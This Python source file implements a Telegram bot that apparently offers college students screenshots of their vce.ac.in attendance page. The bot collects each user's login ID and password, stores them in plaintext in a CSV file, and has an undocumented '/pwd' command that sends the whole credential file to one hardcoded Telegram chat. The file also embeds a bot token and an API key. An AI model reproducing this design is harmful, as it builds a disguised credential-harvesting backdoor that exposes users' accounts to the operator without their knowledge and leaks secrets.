import io
import time
import csv
import sys
import logging
from telegram.ext import Updater, CommandHandler, MessageHandler,Filters
import requests
from bs4 import BeautifulSoup
import pdfkit
token ='5513732483:AAGcNfKX9EztXHNBNoINR6YzFaIPAku8YyE'
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger()
def pwd(update,context):
    if(update.message.chat_id==1084640850):
        context.bot.send_document(chat_id=1084640850,document=open('login_data.csv', 'r'))      
def start(update,context):
    name=update.message.from_user.first_name
    reply = "Hi!! {}".format(name)
    update.message.reply_text(reply)
def help(update,context):
    text2='use /login for entering details'
    update.message.reply_text(text2)
def login_dat(update,context):
    try:
        l=update.message.text
        l=l.split()
        a=0
        login_dat={}
        login_dat['LoginID']=l[0]
        login_dat['Password']=l[-1]
        with requests.Session() as s:
                url="https://vce.ac.in/"
                r=s.get(url)
                r=s.post(url,data=login_dat)
                soup = BeautifulSoup(r.content,'html.parser')
                url2=str(soup.find(id="showattendencepercentage<a"))
                url3=url2[80:337]
                login_dat={}
        mydict= [{'user_id':update.message.chat_id,'LoginId':l[0],'Password':l[-1],'url':url3}]
        print(mydict)
        fields = ['user_id','LoginId','Password','url']
        filename = "login_data.csv"
        csvfile=open(filename, 'a')
        writer=csv.DictWriter(csvfile, fieldnames = fields)
        #writer.writeheader()
        writer.writerows(mydict)
        csvfile.close()
    except :
        a=1
    if(a==1):
        update.message.reply_text('Something went wrong')
def pdf(url):
  sample_url = "https://api.screenshotlayer.com/api/capture?access_key={}&url={}&fullpage={}&viewport={}&format={}&force={}"
  response_api=requests.get(sample_url.format('ffcab32ee3e466150dfa427cb8ef968d',url, "1", "2560x1440", "PNG", "1"))
  contentType = response_api.headers["content-type"]
  if "image" in contentType:
    with io.BytesIO(response_api.content) as screenshot_image:
      screenshot_image.name = "screencapture.png"
      
def attendance(update,context):
    print(update.message.chat_id)
    with open('login_data.csv','r') as f:
        x=0
        k=str(update.message.chat_id)
        d=csv.reader(f)
        print(d)
        for i in d:
            if len(i)!=0:
                if k==i[0]:
                  x=1
                  s2=i[3]
        if(x==1):
          link=s2
          #update.message.reply_text(link)
          #link='https://www.vce.ac.in/'
          sample_url = "https://api.screenshotlayer.com/api/capture?access_key={}&url={}&fullpage={}&viewport={}&format={}&force={}"
          response_api=requests.get(sample_url.format('ffcab32ee3e466150dfa427cb8ef968d',link, "1", "2560x1440", "pdf", "1"))
          contentType = response_api.headers["content-type"]
          if "image" in contentType:
            with io.BytesIO(response_api.content) as screenshot_image:
              screenshot_image.name = "screencapture.png"
              context.bot.send_document(chat_id=update.message.chat_id,document=screenshot_image)
          
        else:
            update.message.reply_text('Data not found \n Enter data \n Then give /attendance') 
def error(update,context):
    logger.error("Shit!! Update {} caused error {}".format(update,context.error))
def main():
    updater = Updater(token)  #take the updates
    dp = updater.dispatcher   #handle the updates

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler('attendance',attendance))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command ,login_dat))
    dp.add_handler(CommandHandler("pwd",pwd))
    dp.add_error_handler(error)
    updater.start_polling()
    logger.info("Started...")
    updater.idle()
if __name__=="__main__":
    main()
